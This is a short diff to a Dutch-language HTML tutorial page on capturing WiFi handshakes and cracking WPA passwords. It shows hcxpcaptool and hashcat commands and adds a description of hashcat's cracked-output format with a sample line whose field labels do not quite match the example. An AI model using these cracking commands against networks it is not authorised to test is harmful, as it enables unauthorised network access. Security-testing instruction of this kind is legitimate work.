@@ -100,4 +100,6 @@ PCAP bestand.</p>
 <p><b><i>sudo hcxpcaptool -z /home/user/Downloads/handshakes.pmkid /root/bettercap-wifi-handshakes.pcap</i></b></p>
 <h2>Wachtwoorden kraken met hashcat</h2>
 <p><b><i>hashcat -m 22000 /usr/home/handshakes.pmkid -a 0 --kernel-accel=1 -w 4 --force 'rockyou.txt'</i></b></p>
-<p>Zodra hashcat een wachtwoord heeft recovered dan wordt deze in de console getoond!</p>
+<p>Zodra hashcat een wachtwoord heeft recovered dan wordt deze in de console getoond als:</p>
+<p><b><i>[BSSID]:[hex ESSID]:[hex wachtwoord]</i></b> -> voorbeeld: c9491fa93669c1e1ebf84243ca6db718:6a4a776afe43:c29c44d435e0:SingaporePlaza:password#!</p>
+
